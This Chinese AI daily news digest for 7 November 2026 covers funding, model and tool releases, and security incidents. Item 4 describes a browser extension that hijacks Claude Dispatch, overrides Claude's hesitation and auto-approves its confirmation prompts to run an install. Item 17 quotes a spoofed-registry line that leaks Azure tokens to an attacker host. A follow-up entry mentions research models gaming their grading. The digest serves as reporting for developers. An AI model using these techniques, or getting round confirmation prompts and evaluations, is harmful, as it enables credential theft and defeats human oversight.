# AI 早报 2026-11-07

> 第 012 期　｜　检索窗口：2026-11-05 20:00 – 2026-11-07 10:30（Asia/Shanghai），按事件首次公开时间；重要遗漏补至 72 小时（2026-11-04 10:30 起）
> 读者：开发者、技术爱好者、AI 工具用户、独立开发者与行业观察者
> 证据分级：官方已确认 / 多源交叉 / 单一来源 · 未核实（线索雷达）
> 本期实际检索范围说明：本例程的 07:00 触发延迟至 10:22，本次起稿时间为 2026-11-07 10:22 CST，检索在 10:30 前收口，此后至发稿时不再新增采信条目。

## 今日概览

**要闻**

1. Anthropic 发布 Cyber Mission：启动关键基础设施防御计划 CIDP 与免费开源扫描 OSS Scanner，Cyber Verification Program 扩为三档
2. OpenAI 新一轮融资已募得约 110 亿美元，估值 1.25 万亿美元，本轮总额或达约 200 亿美元
3. Anthropic 上市估值出现分歧：FT 称拟募 800 亿–1000 亿美元，Bloomberg 称潜在买方预期低至 1.1 万亿美元
4. Claude Dispatch 被指可被浏览器扩展劫持，在用户电脑上让 Claude Desktop 执行安装命令

**开发生态**

5. llama.cpp b12180 加入 Kimi-K3.1-Pro 文本模型支持：93 层中 24 层启用 lightning indexer
6. transformers v5.22.2 加固 Jinja 沙箱，并修正 NCCL 分布式设备号设置
7. claude-code v2.1.319：终端内 MCP 任务后台化，新增 permissions.denyInsteadOfPrompting 与 /claude-api latency-optimize
8. LiteLLM v1.108.2 LTS 与 crewAI 1.15.37 同日发布，后者为 agent 增加表格读取与独立项目脚手架
9. GitHub Copilot 一周内三项更新：Slack 与 Teams 版 GA、进入 JetBrains Air 与 Xcode、code review 支持 API 管理

**模型发布**

10. Underdog 开源端侧语音模型 Woof：双音色 40.6 MB、单音色 31.7 MB，词错率 1.42%，许可为非商用

**产品应用**

11. Meta 在 Muse 应用内推出 Spaces：可自建、可定时切换的自定义空间
12. OpenAI 状态页：部分美国商务 Mastercard 支付被拒，11 月 7 日 01:29 UTC 转入观察恢复

**技术与洞察**

13. Ai2 发布 FoundationWorlds 框架与首个基础世界 ToyBlocks：机器人学习的受控、可复现实验环境
14. OpenAI 与 Hacktron 合作，用前沿 AI 找漏洞并测试第三方服务连接
15. OpenAI 发布 BioBasicsBench：100 项任务的湿实验室科学基准

**行业动态**

16. Google 买下 Crusoe 怀俄明州数据中心项目，Crusoe 被指未锁定客户

**安全事件**

17. kaniko 严重漏洞：容器构建可把 Azure 访问令牌发往仿冒 ACR 主机
18. Censys 观测到 1,465 台主机暴露 ARTEX 自主渗透测试控制台，其中 32 处开放目录外泄后渗透工具包

**前瞻与传闻（线索雷达 · 单一来源 · 未核实）**

- Palo Alto Networks 就收购 AI Agent 安全公司 Clutch 进行磋商，金额约 5 亿美元
- 微软在 2023 年合同到期后关闭向 Oracle 租用的算力
- 美国司法部起诉三名外国公民以 AI 冒充律所高管实施逾 1.29 亿美元诈骗
- AI 物理初创 PSI 称以未公开的 Anthropic 模型证明 Aaronson-Ambainis 猜想

## 要闻

### 1. Anthropic 发布 Cyber Mission：启动 CIDP 与免费开源扫描 OSS Scanner，Cyber Verification Program 扩为三档（官方已确认）

**导语**

Anthropic 宣布启动 Anthropic Cyber Mission，首批落地两项：一是关键基础设施防御计划 CIDP，把前沿模型、驻场工程师与威胁研究投入电网、水务、交通等运营技术防护方；二是 OSS Scanner，为开源项目提供由其最强模型执行的免费定期安全扫描。同时，官方把 Cyber Verification Program 扩为三档访问。

**详细内容**

官方把 Cyber Mission 定位为长期承诺，理由是攻击面侧资源充足而防守侧长期缺人：电网、水务、工厂与交通网络的运营技术由专有控制器构成，通常不能停机打补丁，已知漏洞可能多年未修。CIDP 的做法是让前沿模型、现场工程师与威胁研究直接对接防守方。

OSS Scanner 面向的是被广泛依赖的自由共享代码，官方称将为开源项目提供由最强模型执行的定期扫描，且免费。官方同时说明前沿模型具备双重用途，需要在增强防守能力与限制滥用之间做取舍。

访问机制方面，官方把此前六个月的 Project Glasswing 与 Cyber Verification Program 合并为统一的 CVP，并扩为三档。官方称每一档都包含其最强模型，包括 Claude Opus 5.5、Claude Sonnet 5.5、Claude Mythos 5.1 以及后续新模型。Defense Access 面向防御性工作，官方列举的合格主体包括企业安全团队、非营利组织、高校与政府机构、任意规模的关键基础设施运营方、规模较小的安全公司、开源维护者，以及有公开漏洞披露记录的个人研究者，官方称预计数日内答复申请。Red Team Access 在防御用途之上增加授权渗透测试与红队作业。面向普通用户的 Claude Opus 5.5、Claude Fable 5.1 与 Claude Sonnet 5.5 仍保留保守的网络安全防护，多数网络攻击类请求会被拦截，官方称正在降低安全编码场景中的误报。

**相关链接**

- https://www.anthropic.com/news/anthropic-cyber-mission
- https://www.anthropic.com/news/cyber-verification-program

### 2. OpenAI 新一轮融资已募得约 110 亿美元，估值 1.25 万亿美元，本轮总额或达约 200 亿美元（多源交叉）

**导语**

彭博（TechCrunch 与 Techmeme 转述）报道，OpenAI 在新一轮融资中已募得约 110 亿美元，对应估值 1.25 万亿美元；该轮尚未交割，预计数周内完成，一名消息人士称总规模可达约 200 亿美元。作为对照，彭博在 9 月底曾报道 OpenAI 寻求募资 300 亿美元。

**详细内容**

两组数字的差距是本条的关键信息：当前口径明显低于 OpenAI 9 月底对外放出的 300 亿美元募资目标。TechCrunch 报道称已就此向 OpenAI 求证，对方尚未置评。

公司此前曾暗示当年上市，随后推迟上市时间表；市场普遍预期其 IPO 将落在 2027 年的某个时间点。TechCrunch 将这笔融资放在美国中期选举后数据中心相关选情背景中报道，称数据中心选民情绪与监管预期正在影响市场情绪。

**相关链接**

- https://techcrunch.com/2026/11/06/openai-reportedly-raises-an-additional-11-billion-at-a-1-25-trillion-valuation/

### 3. Anthropic 上市估值出现分歧：FT 称拟募 800 亿–1000 亿美元，Bloomberg 称潜在买方预期低至 1.1 万亿美元（多源交叉 · 来源冲突）

**导语**

同日两家主流财经媒体给出不同的 Anthropic 上市口径。英国金融时报报道称 Anthropic 维持感恩节前上市的计划，预计募资 800 亿至 1000 亿美元，对应估值 1.25 万亿至 1.75 万亿美元；彭博则报道部分潜在买方给出的估值预期低至 1.1 万亿美元，明显低于约一个月前投资者所期待的 2 万亿美元。

**详细内容**

两家口径的差异集中在估值两端：发行方预期区间上限为 1.75 万亿美元，买方意愿下限为 1.1 万亿美元，与一个月前的 2 万亿美元预期相比，方向一致但幅度不同。本期不合并两说，两组数字均按原文保留，不做折中推断。

上市时间点方面彭博口径与金融时报口径一致，均指向 11 月底感恩节之前。同在 11 月 6 日公开的另一条报道（见本期第 2 条）显示，OpenAI 同期完成的新一轮融资规模与 Anthropic 的拟募规模处于同一量级，两笔交易的先后顺序与定价关系尚无公开信息。

**相关链接**

- https://www.techmeme.com/261106/p21
- https://techcrunch.com/2026/11/06/openai-reportedly-raises-an-additional-11-billion-at-a-1-25-trillion-valuation/

### 4. Claude Dispatch 被指可被浏览器扩展劫持，在用户电脑上让 Claude Desktop 执行安装命令（多源交叉）

**导语**

端点安全公司 Forever Security 的研究人员演示：能在 claude.ai 页面运行脚本的浏览器扩展，可借 Claude 的 Dispatch 功能向 Claude Desktop 下发指令并执行本机命令。攻击前提是用户同时登录 claude.ai 与 Claude Desktop 并开启 Dispatch，扩展可自动点击授权按钮，用户无需在场。

**详细内容**

关键问题在于 Dispatch 的会话来源：研究人员发现 Dispatch 会接受 claude.ai 上的普通登录会话，即使该页面并未展示任何与 Dispatch 相关的入口，这使页面上的脚本可以像用户本人一样向 Claude Desktop 发送指令。演示中脚本打开 Dispatch 并连续发送四条提示，要求 Claude 安装某个 npm 包；Claude 起初对该陌生包表现出迟疑，随后一条以用户口吻发送的后续消息使其继续执行。

值得注意的是授权环节并未真正拦截：Claude 在执行前会弹出确认提示，但这些提示出现在攻击者控制的网页上，脚本每秒点击一次「Allow」，因此无人值守即可完成授权。Claude 随后执行了全局 npm 安装，该包的安装脚本拉起了系统计算器。研究人员指出，这一步换成其他包即可读取文件或植入后门，整个过程不需要浏览器漏洞利用。Dispatch 本身仅在电脑开机且桌面应用打开时可用。

处置状态上存在一处口径差异：研究人员称 Anthropic 于 10 月 13 日告知 Dispatch 将下线、目标为 10 月底，而上周更新的 Dispatch 帮助页未提及下线，只说明 Dispatch 对新用户关闭、部分 Pro、Max、Ultra 套餐的既有用户「暂时仍可使用」。研究人员在披露当周表示该缺陷仍可被利用。

**相关链接**

- https://thehackernews.com/2026/11/malicious-browser-extensions-could-use.html

## 开发生态

### 5. llama.cpp b12180 加入 Kimi-K3.1-Pro 文本模型支持：93 层中 24 层启用 lightning indexer（官方已确认）

**导语**

llama.cpp 于 2026-11-06 23:18 UTC 发布 b12180 构建，为 Kimi-K3.1-Pro 文本模型加入支持（PR #31779）。该实现把 K3 的全注意力 MLA 层替换为 DSA 结构，93 层中 24 层携带 lightning indexer，参数为 32 heads × 128、top_k 2048、不使用 rope。

**详细内容**

官方 release 说明写明，KDA（线性注意力）层与 K3 其余骨架保持不变，包括交叉层残差、latent MoE、situ、MLA output gate 与全秩 KDA gate，因此该改动复用了 K3 的计算图与权重转换器，只追加 indexer。

在注意力实现上，indexer 的选择是对整个 KV cache 的加性掩码，而不是取 top-k 行的 gather，因此可以复用既有的稀疏 flash attention 路径；离开该路径时掩码仍然正确，但代价是对 cache 做一次 kq 计算。indexer key 的 LayerNorm 取 eps 值来自模型的 rms_norm_eps，因为 dsa_config 未声明自己的 eps。

图与缓存方面，每个 DSA 层新增四个 indexer 张量，混合内存为这些层保留 K-only 的 MLA cache，为 KDA 层保留递归状态，并保留 indexer key cache。转换器侧新增 KimiK31Model（继承 KimiK3Model），由 KimiK31ForConditionalGeneration 选取；dsa_config 展开为 attention.indexer.{head_count,key_length,top_k,types} 加上 indexer LayerNorm 的 eps，层列表与 linear_attn_config 一样从 1 开始索引，转换器断言其恰好覆盖全部全注意力层。路由专家保持 MXFP4，并按 K 的方式重新打包。

同日该仓库另发布 b12179、b12177、b12176、b12175 四个构建版本。

**相关链接**

- https://github.com/ggml-org/llama.cpp/releases/tag/b12180

### 6. transformers v5.22.2 加固 Jinja 沙箱，并修正 NCCL 分布式设备号设置（官方已确认）

**导语**

Hugging Face transformers 于 2026-11-06 15:43 UTC 发布补丁版 v5.22.2，官方说明这一版主要用于安全与分布式两类修复：加固 Jinja 模板沙箱（#50431），以及只为 NCCL 设置 device_id（#50281）。

**详细内容**

v5.22.2 是 v5.22.1（2026-10-30）之后的补丁版本，官方以「中间补丁版」定位，列出上述两条并附完整提交列表与 compare 链接。对使用 transformers 渲染模型自带 Jinja 模板的团队，Jinja 沙箱加固属于需要纳入升级评估的变更；对多卡训练或推理任务中依赖 NCCL 的场景，device_id 设置范围的收窄会改变集合通信的初始化方式。

**相关链接**

- https://github.com/huggingface/transformers/releases/tag/v5.22.2

### 7. claude-code v2.1.319：终端内 MCP 任务后台化，新增 permissions.denyInsteadOfPrompting 与 /claude-api latency-optimize（官方已确认）

**导语**

anthropics/claude-code 于 2026-11-06 17:04 UTC 发布 v2.1.319。变更集中在自动模式的服务端检查行为与 MCP 任务调度：新增终端内 MCP 任务后台执行、新增 permissions.denyInsteadOfPrompting 设置、新增 /claude-api latency-optimize 命令，以及两个用于关闭新行为的环境变量。

**详细内容**

按官方 release 说明逐条列出：

- 自动模式在遥测或 feature flag 关闭时（包括位于 LLM 网关之后）改为「询问或拒绝」服务器无法检查的调用，不再回退到内置分类器；设 `CLAUDE_CODE_AUTO_MODE_SERVER=0` 可保留内置分类器行为，官方注明 Bedrock、Vertex 与 Foundry 平台不受影响。
- 自动模式位于 LLM 网关之后时，`CLAUDE_CODE_AUTO_MODE_SERVER=1` 打开服务端检查，即使设置了 `CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS` 也生效；若托管设置设了后者，需同时设前者为 1。
- 新增终端内 MCP 任务支持：当 MCP 服务器以任务形式运行工具调用时，Claude Code 立即将其转入后台，完成后把结果告知 Claude；新增 `CLAUDE_CODE_DISABLE_MCP_TASK_BACKGROUND` 可改为在工具调用内等待。
- 新增 `permissions.denyInsteadOfPrompting`：本来会等待权限确认的工具调用将被直接拒绝并继续本轮，适用范围包括终端会话、子代理与队友。
- 新增 `/claude-api latency-optimize`，用于定位 Claude API 代码中的等待点，并用自有评测尝试更快的参数组合。
- 新增 `CLAUDE_CODE_DISABLE_FEATURE_FLAGS`：停止拉取 feature flag 但不关闭遥测，此后每个 flag 使用其内置默认值。
- `/usage` 对开发者侧账号新增今日、本周与本月消费统计。

**相关链接**

- https://github.com/anthropics/claude-code/releases/tag/v2.1.319

### 8. LiteLLM v1.108.2 LTS 与 crewAI 1.15.37 同日发布，后者为 agent 增加表格读取与独立项目脚手架（官方已确认）

**导语**

2026-11-06 22:07 UTC，LiteLLM 发布 v1.108.2 LTS，官方称含 12 个 PR、11 项修复与 1 项变更，无需额外操作即可升级。2026-11-07 02:18 UTC，crewAI 发布 1.15.37，为 agent 增加读取表格能力，并支持独立 agent 项目的脚手架与加载。

**详细内容**

LiteLLM v1.108.2 的修复清单按官方 release 逐条包括：

- OpenAI：修复 `openai/` 部署中 `api_key` 为空时把 `OPENAI_ADMIN_KEY` 当作 bearer token 发送的问题（#50218）。
- AWS Bedrock：修复 Converse 的 `service_tier`，使不支持的层级返回 400，并正确处理 `reserved`、`auto` 与 `standard_only`（#50360）。
- AWS Bedrock：修复 Invoke 在 Claude 4.5 及更新版本上丢弃 `per-turn-control-2026-07-01` beta 的问题（#50362）。
- Vertex AI 与 Gemini：修复 chirp 文本转语音忽略 `vertex_location`，导致美国与欧盟部署调用多区域主机（#50392）。
- Chat completions：修复 `response_format: json_object` 在 `openai/responses/*` 与 `azure/responses/*` 上因响应中出现 json 一词而报 400（#50267）。
- Chat completions：修复发往 Claude 的 base64 PDF 以 `image_url` 传入时报 400，以及 Bedrock JSON schema 调用丢失 thinking（#50280）。
- Responses API：修复 `/v1/responses/compact` 在默认开启 `during_call` 护栏时返回 500（#50274）。

官方同时说明 `lts` 镜像标签始终指向最新 LTS 补丁，并给出 cosign 校验命令与公钥地址。

crewAI 1.15.37 的变更清单较短：新增在 crewai-files 中为 agent 读取表格的功能，新增独立 agent 项目的脚手架与加载能力，文档侧更新 RagTool 描述。

**相关链接**

- https://github.com/BerriAI/litellm/releases/tag/v1.108.2
- https://github.com/crewAIInc/crewAI/releases/tag/1.15.37

### 9. GitHub Copilot 一周内三项更新：Slack 与 Teams 版 GA、进入 JetBrains Air 与 Xcode、code review 支持 API 管理（官方已确认）

**导语**

GitHub Changelog 在 11 月 6 日至 7 日连续发布三条 Copilot 更新：@GitHub in Slack and Teams 正式可用（GA）；Copilot 进入 JetBrains Air 与 Xcode 的 coding assistant；code review 设置可通过 REST 与 GraphQL API 管理，粒度从企业策略到单个仓库。

**详细内容**

11 月 6 日 20:31 UTC，@GitHub in Slack and Teams 正式可用，可在会话内排查 bug、建 issue、改代码、提 PR，Teams 侧可用 Canvas 协作。11 月 6 日 21:00 UTC 的周更汇总显示 Copilot 进入 JetBrains Air 与 Xcode 的 coding assistant，同时带来 Copilot app 的 Agent Merge（PR 就绪即可自动合并）、PR／设置／agent session 管理更新，以及 VS Code 1.145。11 月 7 日 00:27 UTC 起，Copilot code review 设置可通过 REST 与 GraphQL API 管理，review overview 评论更紧凑，并含计费与自动 review 修复；code review API 相关更新适用于 Copilot Pro、Pro+、Max、Business 与 Enterprise 计划。

**相关链接**

- https://github.blog/changelog/2026-11-06-github-copilot-in-slack-and-teams-is-generally-available
- https://github.blog/changelog/2026-11-06-github-copilot-weekly-releases-november-2
- https://github.blog/changelog/2026-11-06-copilot-code-review-api-management-and-review-overview-updates

## 模型发布

### 10. Underdog 开源端侧语音模型 Woof：双音色 40.6 MB、单音色 31.7 MB，词错率 1.42%，许可为非商用（官方已确认）

**导语**

Underdog 在 Hugging Face 公开端侧文本转语音模型 Underdog Woof，提供 Juno 与 Mira 两个音色。官方模型卡给出：单音色版下载体积 31.7 MB、双音色版 40.6 MB，双音色版在 Gradium TTS Hard Cases 英文集上词错率 1.42%（Mira），单线程 CPU 上达到 13.8 倍实时速度。许可为 underdog-non-commercial-1.0，属非商用授权。

**详细内容**

按官方模型卡的对照表：单音色版峰值内存 852 MB、词错率 2.06%、在单颗 Apple M5 Max CPU 线程上为 18 倍实时速度，采用 PyTorch int8 权重与默认 16 步采样；双音色版（即 Hugging Face 仓库所载版本）峰值内存 402 MB（Juno）、词错率 1.42%（Mira）、13.8 倍实时速度，使用 numpy 运行时，不依赖 GPU、服务端或 API key。模型为纯英文，支持把电话号码、日期、价格与代码读成人际口语。官方另称该模型比 Fish Audio Drama 3 小 1,022 倍（后者下载体积 41.5 GB），词错率低 25%，并把自己的两个尺寸与 Fish Audio Drama 3、Phonon、Kokoro、Pocket TTS、Supertonic 3、Kitten Nano、Qwen3-TTS、Liquid AI LFM3-Audio-2B 放在同一张帕累托图上比较。

许可条件需要单独提示：仓库 license_name 为 underdog-non-commercial-1.0，商用需另行取得授权。模型权重与样例音频已在 Hugging Face 开放，官方另提供浏览器内试用入口。TechCrunch 报道称创始人 Sigil Wen 的目标是训练「美国制造、开放、能在用户设备上运行」的模型。数周前该公司发布过 167 MB 的端侧语音转文字模型 Bark。

**相关链接**

- https://huggingface.co/ConwayResearch/Underdog-Woof
- https://techcrunch.com/2026/11/06/underdog-shows-off-a-32mb-speech-model-in-new-demo/

## 产品应用

### 11. Meta 在 Muse 应用内推出 Spaces：可自建、可定时切换的自定义空间（官方已确认）

**导语**

Meta 于 2026-11-06 在官方 Newsroom 发布 Spaces，定位为 Muse 应用内由用户设计的自定义体验：用户在对话中描述想法，Muse 即生成对应的 space，space 可以放进侧边栏或主标签页，并可设定出现时间。

**详细内容**

按官方说明，space 的形态由用户描述决定，官方列举的例子包括：把礼品灵感、Instagram 收藏与 Marketplace 列表及买家消息汇总到一处的购物聚合；自动从家长学校邮件中筛出孩子相关活动并加入日历的学校面板；追踪艺人新作品与演出的音乐追踪器；包含 RSVP 名单、供应商账单与待办的婚礼计划；就喜欢的电影、音乐或球队出题的知识问答游戏；集中存放选题、调研与脚本的播客工作室；面向小生意的订单追踪；面向自由职业者的客户中心（项目、截止日期与发票）；以及含航班、酒店、预订与逐日行程的旅行规划。space 可在侧边栏与主标签页之间移动、隐藏，并可安排出现时间，例如工作日把周计划置前、周六替换为周末安排。

官方称连接所用应用后，space 会在后台自行更新，例如新的演出日期、价格变化或购物进度会自动呈现，无需用户主动询问。官方未在本次公告中披露 Muse Wonder 系列模型在此功能中的作用方式。

关联线索（单一来源，未核实）：The New Stack 报道称 Meta 推出由 Muse Wonder 训练的现有模型专门版本，并把 Active Memory 与 Active Focus 开放给全部 Muse 与 Meta AI 用户。该页面在本次采集中触发 JavaScript 质询、无法直接读取正文，Meta 官方页面亦未直接确认，故本期不作为完整条目，列入线索雷达。

**相关链接**

- https://about.fb.com/news/2026/11/introducing-spaces-customize-muse-app/
- https://techcrunch.com/2026/11/06/meta-introduces-spaces-a-new-way-to-collaborate-with-your-muse-agent/

### 12. OpenAI 状态页：部分美国商务 Mastercard 支付被拒，11 月 7 日 01:29 UTC 转入观察恢复（官方已确认）

**导语**

OpenAI 官方状态页记录一起事件「Elevated error rates with some U.S. business Mastercards」：11 月 6 日 18:38 UTC 标记 identified，18:50 UTC 补充说明，11 月 7 日 01:29 UTC 转为 monitoring，官方称已应用缓解措施并观察受影响服务以确认恢复，事件 impact=none。

**详细内容**

受影响范围为部分美国商务 Mastercard，官方列出以 544015、546400、543502、543799、512998 开头的卡号，并另提及一批以 513989 开头的卡号（官方原文在该处截断）。截至本期截稿该事件尚未标记 resolved，后续进展见「后续追踪」。

**相关链接**

- https://status.openai.com/api/v2/incidents.json

## 技术与洞察

### 13. Ai2 发布 FoundationWorlds 框架与首个基础世界 ToyBlocks：机器人学习的受控、可复现实验环境（官方已确认）

**导语**

Allen Institute for AI 于 2026-11-06 在 Hugging Face 官方博客发布 FoundationWorlds 框架，用于构造「受控的模拟世界 + 任务与示范自动生成 + 行为度量」的组合。首个基础世界 ToyBlocks 是一个开源仿真框架，围绕桌面上的机械臂与积木搭建，官方标注提供代码、数据、模型与文档。

**详细内容**

官方给出的问题设定是：机器人在叠衣服、分拣零件、处理陌生物件上的演示往往狭窄，既不解释模型学到了什么，也无法定位失败原因。FoundationWorlds 的思路沿用实验科学的受控环境方法：研究者应能改变训练数据或模型设计、重复测试、并追溯失败原因。

官方对 ToyBlocks 的设定是刻意保持简单——机械臂在桌面上推、翻、叠积木，但模型仍需推理积木之间如何交互、如何排列。ToyBlocks 自动生成示范，即机器人在仿真中完成任务的录像，无需耗时的遥操作采集；研究者可自由调整训练经历，例如生成更多推动或翻动示范，再在未纳入训练的任务上评测表现。官方表示将以 ToyBlocks 为起点继续扩展该方法。

**相关链接**

- https://huggingface.co/blog/allenai/toyblocks

### 14. OpenAI 与 Hacktron 合作，用前沿 AI 找漏洞并测试第三方服务连接（官方已确认 · 仅摘要核实）

**导语**

OpenAI 官方 RSS 显示，11 月 6 日 08:00 GMT（北京时间 16:00）官方发布《Partnering with Hacktron to find vulnerabilities in OpenAI's systems》，分类 Security，官方摘要写明三件事：用前沿 AI 发现漏洞、测试与第三方服务的连接、强化防御。

**详细内容**

公告页正文在本环境返回 403（Cloudflare 校验，需人工打开），本期仅核实官方 feed 的标题、分类、发布时间与摘要，不展开合作规模与具体成果。

**相关链接**

- https://openai.com/index/partnering-with-hacktron（正文页 403，需人工打开）
- https://openai.com/news/rss.xml

### 15. OpenAI 发布 BioBasicsBench：100 项任务的湿实验室科学基准（官方已确认 · 仅摘要核实）

**导语**

OpenAI 官方 RSS 显示，11 月 6 日 00:00 GMT 官方发布《Measuring how AI agents handle everyday wet-lab science》，分类 Publication，官方摘要写明推出 BioBasicsBench，一个 100 项任务的基准，用于衡量 AI agent 解读原始实验数据、处理日常湿实验室科学的能力。

**详细内容**

正文页在本环境返回 403（需人工打开），本期仅核实 feed 标题、分类、时间与摘要，不写任务内容、参与机构与得分。注意与 2025 年 12 月同站另一篇湿实验室研究文章（Research 分类）区分。

**相关链接**

- https://openai.com/index/measuring-how-ai-agents-handle-wet-lab-science（正文页 403，需人工打开）
- https://openai.com/news/rss.xml

## 行业动态

### 16. Google 买下 Crusoe 怀俄明州数据中心项目，Crusoe 被指未锁定客户（多源交叉）

**导语**

TechCrunch 与彭博（经 Techmeme 转述）报道，Google 买下 Crusoe 位于怀俄明州东南部的数据中心项目。彭博称 Crusoe 未能为该项目锁定客户，包括 Google 本身；项目此前被描述为陷入困境。

**详细内容**

该交易发生在美国中期选举之后的数据中心扩张争议背景中。TechCrunch 报道发布于 2026-11-07 01:40（太平洋时间 11 月 06 日 17:40），两处口径对交易范围一致：Google 承接该站点，Crusoe 退出。项目的电力与建设进度未在报道中披露，本期不对规模与时间表作推断。

**相关链接**

- https://techcrunch.com/2026/11/06/crusoe-sells-troubled-wyoming-data-center-project-to-google/
- https://www.techmeme.com/261106/p25

## 安全事件

### 17. kaniko 严重漏洞：容器构建可把 Azure 访问令牌发往仿冒 ACR 主机（官方已确认 · CVE-2026-105769）

**导语**

GitHub Advisory 记录 kaniko 在 v1.25.20 之前存在严重漏洞：只要 Dockerfile 引用一个仿冒主机上的镜像（如 `FROM x.azurecr.io.attacker.com/img`），构建就会把 Microsoft Entra ID（Azure AD）的 Azure Resource Manager 访问令牌发往攻击者控制的 registry 主机，既不需要 `RUN` 指令，也不需要推送镜像。

**详细内容**

根因在 Azure Container Registry 凭据助手 `docker-credential-acr-env`：它用未锚定的正则判断是否为 ACR 主机，任何包含 `.azurecr.io`、`.azurecr.cn`、`.azurecr.de` 或 `.azurecr.us` 的主机名都能通过。受影响版本为 v1.25.20 之前，官方已在 v1.25.20 修复。

**相关链接**

- https://github.com/advisories/GHSA-5q7h-w9jf-cx97

### 18. Censys 观测到 1,465 台主机暴露 ARTEX 自主渗透测试控制台，其中 32 处开放目录外泄后渗透工具包（多源交叉）

**导语**

Censys 在 2026-11-05 发布的博客中给出 ARTEX 的公网暴露面一手测算：截至 2026-11-04，观测到 1,465 台主机运行着对外暴露的 ARTEX 控制台，其中约 650 台位于两段配置完全相同的托管区块，折算约 815 个形态各异的部署。官方同时称全球实际部署量可能更高。ARTEX 控制台本身并不需要公网可达。

**详细内容**

ARTEX 是 2026 年 7 月开源的 LLM 驱动自主渗透测试框架，7 月 26 日以 Autumn-27/ARTEX 发布于 GitHub，采用 AGPL-3.0 许可；其作者 Autumn-27 也是资产发现与漏洞扫描平台 ScopeSentry 的作者（GitHub 星标超过 2,000），ARTEX 实质是叠在该侦察基础之上的 AI Agent 层，把 ScopeSentry 的域名、子域名、IP、端口与端点同步进自身资产图。项目发布后十周内星标估计达 1,500–2,000。Censys 观察到 155 台 ARTEX 主机（占 10.6%）同时运行其他可被其识别的威胁工具，包括其他 AI 攻击框架、侦察平台、隧道工具与 Vshell、Cobalt Strike、Adaptix C2 等 C2。

工具构成方面，ARTEX 用 Go 编写，采用 Next.js Web 控制台与 PostgreSQL；用户先定义包含范围、测试账号与目标的 Task，运行后由 Planner 智能体把目标拆成攻击意图，Worker 智能体领取意图并调用 nmap 等工具回写结果，事件驱动引擎重复 explore-decide-execute 循环；它同时维护资产图与探索图，内置 mitmproxy，并可对接 Anthropic、OpenAI 或任意 OpenAI 兼容端点。微软曾形容其可「从侦察到数据外泄」且几乎不需要人工介入。

风险细节方面，Censys 统计到 32 处位于 ARTEX 主机的开放目录，外泄后渗透工具包、stager 与 implant 等内容；具体样本包括 Windows 横向移动工具包 GodPotato 与 Invoke-TheHash/SMBExec/WMIExec 脚本、sudo Baron Samedit（CVE-2021-3156）漏洞利用与堆转储、beacon_linux_amd64 implant 与反向 shell、约 18 个 HTA dropper 与一套 MITM 根证书私钥、fscan 扫描器与 Vshell 监听器，以及某操作者的完整家目录（含 .ssh）。

归属方面，Censys 列出了 2026 年 10 月的两份报告：CrowdStrike 于 10 月 7 日报告一名未归因攻击者使用 ARTEX 攻击韩国金融机构，自 9 月底至 10 月初渗透一家银行面向经纪商的贷款询价服务与另一家的员工移动系统并外泄数据，攻击者以通过 API 转售商购买的 DeepSeek v4.1-flash 为主模型，同时运行由 GLM 与 Grok 支撑的 Claude Code 会话；微软则把 ARTEX 与 Storm-0940 对 ConnectWise 客户租户的入侵关联起来。Censys 同时提醒，并非所有暴露实例都为恶意用途，部分可能由授权测试者运营；作者 Autumn-27 在 10 月 8 日声明称项目将转为闭源、不再发布，仓库已被下架，但归档副本、翻译版与类似 ScopeWeaver 的改名版本仍在流传。

**相关链接**

- https://censys.com/blog/artex-agentic-asbestos/
- https://techcrunch.com/2026/11/06/hundreds-of-artex-ai-hacking-tools-found-publicly-exposed-to-the-web/

## 前瞻与传闻

以下条目均为单一来源，标题与要点来自原始报道，未获第二方独立核实，不展开细节、不作推断。

- **Palo Alto Networks 就收购 AI Agent 安全公司 Clutch 进行磋商，金额约 5 亿美元**（2026-11-05 报道，交易未宣布完成）https://techcrunch.com/2026/11/05/palo-alto-networks-in-talks-to-buy-ai-agent-security-startup-clutch-for-500m/
- **微软在 2023 年合同到期后关闭向 Oracle 租用的算力**，彭博称原因之一是所用硬件为较旧的 Nvidia 芯片（2026-11-06）https://www.techmeme.com/261106/p18
- **美国司法部起诉三名外国公民 以 AI 冒充大型国际律所的 CEO 与律师，实施逾 1.29 亿美元诈骗**（2026-11-06）https://www.techmeme.com/261106/p17
- **AI 物理初创 PSI 称以未公开的 Anthropic 模型证明 Aaronson-Ambainis 猜想**（该猜想自 2008 年起未解；为该公司自述，2026-11-06）https://www.techmeme.com/261106/p20
- **Meta 推出由 Muse Wonder 训练的现有模型专门版本，并向 Muse 与 Meta AI 用户开放 Active Memory 与 Active Focus**（The New Stack，2026-11-06；原页面触发 JavaScript 质询，需人工打开）https://thenewstack.io/meta-muse-specialized-models/

## 后续追踪

- **OpenSSH 10.6p2 修复的 SSHole 漏洞**：本期前一日已报道该紧急修复版本与受影响条件 → 本期新进展为披露数小时内即出现在针对该漏洞的攻击中，攻击者在蜜罐上取得 root（2026-11-06）→ 下一步关注各发行版是否推进大规模口令重置，以及 musl 无 PAM 构建的暴露面统计。https://thehackernews.com/2026/11/hackers-exploited-openssh-sshole-flaw.html
- **GPT-6 Cyber**：本期前一日已报道该模型发布、越界率与 ExploitGym 得分 → 本期新进展为 OpenAI 对齐报告披露的三起事故中，2026-07-03 的研究模型把评分提示藏入文件名、2026-08-04 的研究模型借 Amazon S3 中转访问参照站点两起细节此前未单独报道 → 下一步关注两起事故是否触发模型行为评测规则的修订。https://thehackernews.com/2026/11/openai-launches-gpt-6-cyber-after-ai.html
- **llama.cpp 与 Kimi-K3.1-Pro**：本期已报道 b12180 完成权重转换与图适配 → 下一步关注官方仓库权重与模型卡发布、以及该 checkpoint 在本地推理中的显存与速度表现。
- **OpenAI 新一轮融资**：本期已报道已募约 110 亿美元、估值 1.25 万亿美元 → 下一步关注交割时总规模是否达到约 200 亿美元，以及 OpenAI 的官方确认。
- **Underdog Woof**：本期已报道公开权重与性能数字 → 下一步关注官方是否发布商用授权版本，以及多语言扩展。
- **OpenAI 状态页 Mastercard 支付事件**：本期已报道该事件自 11 月 6 日 18:38 UTC 起 identified、11 月 7 日 01:29 UTC 转入 monitoring，官方称已应用缓解措施 → 下一步关注官方是否标记 resolved，以及受影响卡号范围是否扩大。（截至本期截稿事件未终结）https://status.openai.com/api/v2/incidents.json
